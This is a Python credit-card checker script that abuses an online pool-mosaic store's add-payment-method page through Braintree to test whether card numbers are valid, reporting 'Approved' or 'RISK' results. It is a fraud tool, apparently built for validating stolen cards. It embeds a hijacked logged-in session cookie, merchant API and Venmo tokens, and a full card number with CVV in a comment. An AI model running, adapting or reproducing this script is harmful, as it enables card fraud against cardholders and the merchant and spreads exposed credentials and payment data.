def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	





	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjA5MTM0NDYsImp0aSI6IjBkMzdkNjM0LTA0NGMtNGVkYS04Y2FjLTU0NDU3YWE0ZTMzNyIsInN1YiI6InBiN2d6NnZrN2J5bXloNGciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBiN2d6NnZrN2J5bXloNGciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiYmx1ZXdhdGVycG9vbG1vc2FpY3NfaW5zdGFudCJ9fQ.kU2B2ZH_wpskeKFsrg3E27V_xGewIb50Y7_g9qMj8ucCYA_hdAIya6nYBEWjw8cfEH62Oo7WUA-0g55f0k7HCA',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'dropin2',
        'sessionId': 'e44512f5-91e0-4642-8dc2-81325785fa06',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"e44512f5-91e0-4642-8dc2-81325785fa06"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4879170025642134","expirationMonth":"04","expirationYear":"2027","cvv":"514","billingAddress":{"postalCode":"10080"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)

	tok = response.json()['data']['tokenizeCreditCard']['token']







	cookies = {
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-07-12%2023%3A24%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.poolmosaics.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-07-12%2023%3A24%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.poolmosaics.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '_gcl_au': '1.1.1977880646.1720826690',
    '_ga': 'GA1.1.519992229.1720826691',
    '_pin_unauth': 'dWlkPVlqUmpNalExWmpjdE5HTTRNQzAwWXpreExXRmtOelV0TURSbU5qVXlaV0ZsT1dZMA',
    '_fbp': 'fb.1.1720826702747.409757733820949178',
    'twk_idm_key': 'D_FuCaAkCAtX0WvlZDUKP',
    'cf_clearance': 'V1aYFcruW2J6Vja9e.bQTEgfsZH0pDsbseaguvd.W_w-1720826752-1.0.1.1-r_D096w9lO4aC9Oau_kl_.0DgdU6w14TVyccTx2tE2vEcebSb6r0HjmwwK8ckdIX5tFOk8PMgy0PZiR.hj9LRg',
    'wordpress_logged_in_59e34a1613b50d31eb7ba9d61a552af5': 'moh5527vbnm%7C1722036373%7CL85ThtxZFZGvpXWIT2OHijXCq1tTPwhI3JuS6LRsRRt%7C18ba98526bff13f27394eee2e2c4d78e6be8020fc96db8c98537e29c4c0dabe9',
    'tinv_wishlistkey': '790ffe',
    'tinvwl_wishlists_data_counter': '0',
    'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.poolmosaics.com%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_85XZQ2X44P': 'GS1.1.1720826690.1.1.1720827051.48.0.0',
    '_uetsid': 'f5ff535040a511ef92fc21287bc3aae7',
    '_uetvid': 'f6008c2040a511efad8ac513b91bcf78',
    'TawkConnectionTime': '0',
    'twk_uuid_5a81d62c4b401e45400ce1a3': '%7B%22uuid%22%3A%221.WrwpwiDf6jRnBvAX5p6DZmuGX9QUyeiDruntIzX69l6LFZTvYNEqGwjVTbtEFMmhTplcs9e3JXuh9xCxkh3QWBqkXIVoGMpoCcggvyzl5rrEVVwDMLgO3MRf4%22%2C%22version%22%3A3%2C%22domain%22%3A%22poolmosaics.com%22%2C%22ts%22%3A1720827056074%7D',
}

	headers = {
    'authority': 'www.poolmosaics.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-12%2023%3A24%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.poolmosaics.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-12%2023%3A24%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.poolmosaics.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _gcl_au=1.1.1977880646.1720826690; _ga=GA1.1.519992229.1720826691; _pin_unauth=dWlkPVlqUmpNalExWmpjdE5HTTRNQzAwWXpreExXRmtOelV0TURSbU5qVXlaV0ZsT1dZMA; _fbp=fb.1.1720826702747.409757733820949178; twk_idm_key=D_FuCaAkCAtX0WvlZDUKP; cf_clearance=V1aYFcruW2J6Vja9e.bQTEgfsZH0pDsbseaguvd.W_w-1720826752-1.0.1.1-r_D096w9lO4aC9Oau_kl_.0DgdU6w14TVyccTx2tE2vEcebSb6r0HjmwwK8ckdIX5tFOk8PMgy0PZiR.hj9LRg; wordpress_logged_in_59e34a1613b50d31eb7ba9d61a552af5=moh5527vbnm%7C1722036373%7CL85ThtxZFZGvpXWIT2OHijXCq1tTPwhI3JuS6LRsRRt%7C18ba98526bff13f27394eee2e2c4d78e6be8020fc96db8c98537e29c4c0dabe9; tinv_wishlistkey=790ffe; tinvwl_wishlists_data_counter=0; sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.poolmosaics.com%2Fmy-account%2Fadd-payment-method%2F; _ga_85XZQ2X44P=GS1.1.1720826690.1.1.1720827051.48.0.0; _uetsid=f5ff535040a511ef92fc21287bc3aae7; _uetvid=f6008c2040a511efad8ac513b91bcf78; TawkConnectionTime=0; twk_uuid_5a81d62c4b401e45400ce1a3=%7B%22uuid%22%3A%221.WrwpwiDf6jRnBvAX5p6DZmuGX9QUyeiDruntIzX69l6LFZTvYNEqGwjVTbtEFMmhTplcs9e3JXuh9xCxkh3QWBqkXIVoGMpoCcggvyzl5rrEVVwDMLgO3MRf4%22%2C%22version%22%3A3%2C%22domain%22%3A%22poolmosaics.com%22%2C%22ts%22%3A1720827056074%7D',
    'origin': 'https://www.poolmosaics.com',
    'pragma': 'no-cache',
    'referer': 'https://www.poolmosaics.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"eed6eca5787aed15675bbd1e15a16a63","fraud_merchant_id":null,"correlation_id":"6c7078aa2f268a7a8b90bc6f03b5cd96"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/pb7gz6vk7bymyh4g/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/pb7gz6vk7bymyh4g"},"merchantId":"pb7gz6vk7bymyh4g","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"pb7gz6vk7bymyh4g","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Blue Water Pool Mosaics","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjA5MTM0NTEsImp0aSI6ImVmMWNkZDI5LTExMWYtNDhhNC05OTQ3LTdlNGQwNWJjNzBiYyIsInN1YiI6InBiN2d6NnZrN2J5bXloNGciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBiN2d6NnZrN2J5bXloNGciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.0T073byVpBS0Oza1AacBOpoP6HMN6-qKfRqhnG0vilfYqH9OpimWyA9MbqSCYrfJ2sO5IJn0xAvdLa2xRj-Jpw","paypalClientId":"AbRFf_gRT-rA6bxk0l5cIpX3oEc7vYAh-Ciliej_zFGX6wya2bVAxYr7JnxNxdeo8uVS_Bd9Q-DGk_D3","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3709157991205549267","accessToken":"access_token$production$pb7gz6vk7bymyh4g$9ad7859b2047b88cf4884200e2b9aacd","environment":"production","enrichedCustomerDataEnabled":true},"paypalEnabled":true,"paypal":{"displayName":"Blue Water Pool Mosaics","clientId":"AbRFf_gRT-rA6bxk0l5cIpX3oEc7vYAh-Ciliej_zFGX6wya2bVAxYr7JnxNxdeo8uVS_Bd9Q-DGk_D3","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"bluewaterpoolmosaics_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': 'd59a4c746a',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post('https://www.poolmosaics.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
	

	











	
	text = response.text
	
	pattern = r'Reason: (.*?)\s*</li>'
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
